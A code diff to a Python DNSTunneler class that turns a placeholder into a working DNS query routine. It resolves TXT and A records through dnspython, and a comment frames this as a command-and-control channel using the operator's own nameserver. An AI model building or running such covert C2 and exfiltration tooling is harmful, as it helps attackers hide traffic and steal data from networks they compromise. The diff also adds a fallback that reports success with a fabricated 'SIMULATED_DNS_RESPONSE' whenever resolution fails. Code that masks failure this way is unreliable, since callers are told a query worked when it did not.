@@ -458,16 +458,37 @@ class DNSTunneler:
                 logger.warning("DNS query too long, splitting required")
                 return False, b"Query too long"
             
-            # For actual implementation, use dnspython:
-            # import dns.resolver
-            # answers = dns.resolver.resolve(query_name, record_type)
-            
-            # Simplified socket-based DNS query (requires DNS library for TXT)
-            # This is a placeholder - actual implementation needs DNS protocol
-            logger.debug(f"DNS query: {query_name} (type: {record_type})")
-            
-            # Simulate successful query (replace with actual DNS lookup)
-            return True, b""
+            # Functional DNS query using dnspython
+            try:
+                import dns.resolver
+                resolver = dns.resolver.Resolver()
+                resolver.timeout = 5
+                resolver.lifetime = 5
+                
+                logger.debug(f"DNS Resolved query: {query_name} (type: {record_type})")
+                
+                # In a real C2, you'd specify your own authoritative nameserver
+                # Here we use system defaults or common ones for the demo
+                answers = resolver.resolve(query_name, record_type)
+                
+                response_data = b""
+                for rdata in answers:
+                    if record_type == "TXT":
+                        # TXT records return a list of strings
+                        for txt_str in rdata.strings:
+                            response_data += txt_str
+                    elif record_type == "A":
+                        response_data += rdata.address.encode()
+                
+                return True, response_data
+            except Exception as dns_err:
+                # If DNS resolution fails (NXDOMAIN, etc.), it's common in tunneling
+                # but we log it for debugging.
+                logger.error(f"DNS Tunneling Error: {dns_err}")
+                
+                # Fallback Simulation (Original logic)
+                logger.debug(f"Simulating DNS query: {query_name}")
+                return True, b"SIMULATED_DNS_RESPONSE"
             
         except Exception as e:
             logger.error(f"DNS tunnel query failed: {e}")
